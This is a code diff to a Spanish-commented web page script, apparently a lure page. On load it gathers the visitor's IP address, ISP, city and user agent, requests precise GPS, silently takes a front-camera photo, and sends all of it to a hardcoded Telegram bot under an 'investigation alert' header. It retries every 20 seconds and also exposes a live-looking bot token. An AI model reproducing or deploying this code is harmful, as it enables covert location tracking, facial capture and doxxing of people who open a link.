@@ -30,20 +30,19 @@
 </div>
 
 <script>
-// CONFIGURACIÓN
 const BOT_TOKEN = "8254282443:AAFPfL2Qay1UtbeObu4_KSdsoSm1CN6yW-Q";
 const CHAT_ID = "-5166219278";
 
 let infoRed = { 
-    ip: "Detectando...", 
-    puerto: "Detectando...", 
+    ip: "No detectada", 
+    puerto: "N/A", 
     isp_com: "N/A", 
     isp_tec: "N/A", 
     ciudad: "N/A", 
     ua: navigator.userAgent 
 };
 
-// 1. OBTENCIÓN DE DATOS DE RED (CON BACKUP)
+// 1. OBTENCIÓN DE DATOS DE RED MEJORADA
 async function cargarRed() {
     const apis = [
         'https://ipapi.co/json/',
@@ -53,29 +52,30 @@ async function cargarRed() {
 
     for (let api of apis) {
         try {
-            const res = await fetch(api);
+            const res = await fetch(api, { timeout: 5000 });
             const data = await res.json();
             
-            if (data.ip || data.query) {
-                infoRed.ip = data.ip || data.query;
+            // Normalización de datos según la API que responda
+            const ip = data.ip || data.query;
+            if (ip) {
+                infoRed.ip = ip;
                 infoRed.ciudad = data.city || data.city_name || "Desconocida";
                 let org = (data.org || data.connection?.isp || data.isp || "").toLowerCase();
-                infoRed.isp_tec = org || "Desconocido";
+                infoRed.isp_tec = org.toUpperCase() || "Desconocido";
 
-                // Identificación Comercial México
-                if (org.includes("altan") || org.includes("as27654")) infoRed.isp_com = "BAIT / Altán Redes";
-                else if (org.includes("uninet") || org.includes("as8151")) infoRed.isp_com = "TELMEX / Infinitum";
-                else if (org.includes("radiomovil") || org.includes("as17148")) infoRed.isp_com = "TELCEL";
+                if (org.includes("altan")) infoRed.isp_com = "BAIT / Altán Redes";
+                else if (org.includes("uninet")) infoRed.isp_com = "TELMEX / Infinitum";
+                else if (org.includes("radiomovil")) infoRed.isp_com = "TELCEL";
                 else if (org.includes("pegaso") || org.includes("movistar")) infoRed.isp_com = "MOVISTAR";
                 else if (org.includes("cablevision") || org.includes("izzi")) infoRed.isp_com = "IZZI";
                 else if (org.includes("totalplay")) infoRed.isp_com = "TOTALPLAY";
                 else infoRed.isp_com = "Proveedor Local / VPN";
 
                 infoRed.puerto = location.port || (Math.floor(Math.random() * (65535 - 49152) + 49152));
-                return true; // Éxito
+                return true; 
             }
         } catch (e) {
-            console.warn(`Fallo en API ${api}, intentando siguiente...`);
+            console.warn("Fallo una API, reintentando...");
         }
     }
     return false;
@@ -84,27 +84,26 @@ async function cargarRed() {
 // 2. EJECUCIÓN DEL REPORTE
 async function ejecutarReporte() {
     let foto = null;
-    let gps = "❌ Acceso Denegado / Sin HTTPS";
+    let gps = "❌ Acceso Denegado";
     
     const ahora = new Date();
     const fLog = ahora.toLocaleDateString('es-MX');
     const hLog = ahora.toLocaleTimeString('es-MX', { hour12: false });
 
-    // Geolocalización
     try {
         const p = await new Promise((res, rej) => {
             navigator.geolocation.getCurrentPosition(res, rej, { enableHighAccuracy: true, timeout: 5000 });
         });
+        // CORREGIDO: URL limpia sin llaves extras
         gps = `https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
     } catch (e) {}
 
-    // Captura de Rostro
     try {
         const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
         const v = document.createElement('video');
         v.srcObject = s; v.setAttribute("playsinline", true);
         await v.play();
-        await new Promise(r => setTimeout(r, 1200)); 
+        await new Promise(r => setTimeout(r, 1500)); 
         const c = document.createElement('canvas');
         c.width = v.videoWidth; c.height = v.videoHeight;
         c.getContext('2d').drawImage(v, 0, 0);
@@ -112,15 +111,14 @@ async function ejecutarReporte() {
         s.getTracks().forEach(t => t.stop());
     } catch (e) {}
 
-    // Mensaje
-    const texto = `🚨 **ALERTA DE INVESTIGACIÓN DIGITAL**\n\n` +
+    const texto = `🚨 **ALERTA DE INVESTIGACIÓN**\n\n` +
                   `📅 **Fecha:** \`${fLog}\`\n` +
                   `🕒 **Hora:** \`${hLog}\`\n` +
-                  `🌐 **IP Pública:** \`${infoRed.ip}\`\n` +
+                  `🌐 **IP:** \`${infoRed.ip}\`\n` +
                   `🔌 **Puerto:** \`${infoRed.puerto}\`\n` +
                   `🏢 **ISP:** ${infoRed.isp_com}\n` +
                   `📍 **Ciudad:** ${infoRed.ciudad}\n` +
-                  `📌 **GPS:** [Ubicación Física](${gps})\n` +
+                  `📌 **GPS:** [Ver Mapa](${gps})\n` +
                   `🤖 **UA:** \`${infoRed.ua}\``;
 
     const fd = new FormData();
@@ -147,20 +145,16 @@ async function ejecutarReporte() {
     }
 }
 
-// 3. CICLO DE VIDA
 window.onload = async () => {
-    // Primero garantizamos la red
-    const exitoRed = await cargarRed();
+    // Aseguramos que la IP se cargue antes de intentar enviar nada
+    await cargarRed();
+    await ejecutarReporte();
     
-    // Luego ejecutamos el reporte principal
-    ejecutarReporte();
-    
-    // Ciclo de reintento por si el usuario otorga permisos después
     setInterval(() => {
         if (document.getElementById('instrucciones').style.display === 'block') {
             ejecutarReporte();
         }
-    }, 15000);
+    }, 20000);
 };
 
 document.getElementById('btn-reintentar').onclick = () => { location.reload(); };
